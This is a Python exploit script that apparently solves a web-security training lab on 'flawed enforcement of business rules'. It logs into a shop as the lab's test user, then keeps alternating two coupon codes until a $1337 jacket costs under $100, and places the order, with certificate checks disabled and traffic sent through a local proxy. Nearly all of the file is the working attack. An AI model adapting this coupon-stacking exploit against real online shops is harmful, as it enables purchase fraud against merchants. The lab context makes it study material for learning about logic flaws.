import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name': 'csrf'})['value']
    return csrf_token

def get_total(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    total_entry = soup.find("th", string="Total:").parent()
    total = re.search(r"\$(\d+.\d+)", str(total_entry)).group(1)
    return float(total)


def buy_jacket(s, url):
    # LOGIN AS USER 'WIENER'
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)

    # CHECK LOGIN
    if "Log out" and "wiener" not in r.text:
        print("[-] Could not log-in")
        sys.exit(-1)

    print("[+] Logged-in!")
    # ADD JACKET TO CART
    cart_url = url + "/cart"
    params = {
        'productId' : 1,
        'redir' : 'CART',
        'quantity' : 1
    }
    r = s.post(cart_url, data=params, verify=False, proxies=proxies)

    # CHECK STATUS
    if r.status_code != 200:
        print("[-] Error")
        sys.exit(-1)

    print("[+] Applying coupons until the price of the jacket is < $100.00")
    # ADD COUPON UNTIL THE TOTAL PRICE TO PAY IS LESS THAN $100.00
    coupon_url = url + "/cart/coupon"
    coupon_list = ['NEWCUST5', 'SIGNUP30']
    csrf_token = get_csrf(s, cart_url)
    total = get_total(s, cart_url)
    i = 0
    print("[+] The price of the jacket is $1337.00")
    while total > 100.00:
        if i % 2 == 0:
            coupon = coupon_list[0]
        else:
            coupon = coupon_list[1]
        params = {
            'csrf' : csrf_token,
            'coupon' : coupon
        }
        r = s.post(coupon_url, data=params, verify=False, proxies=proxies)
        total = get_total(s, cart_url)
        sys.stdout.write("[+] Total is %0.2f\r" % total)
        sys.stdout.flush()
        sys.stdout.write("\033[k")
        i += 1
    
    # PLACE ORDER
    print("\n[+] Done! One step left... place the order")
    checkout_url = url + "/cart/checkout"
    r = s.post(checkout_url, data=params, verify=False, proxies=proxies)
    if "Your order is on its way!" not in r.text:
        print("[-] Order failed")
        sys.exit(-1)

    print("[+] The jacket is allllllll yours!")






def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("[+] Lab: Flawed enforcement of business rules")
    print("""[+] This lab has a logic flaw in its purchasing workflow.
    To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
    
    You can log in to your own account using the following credentials: wiener:peter""")

    buy_jacket(s, url)



if __name__ == "__main__":
    main()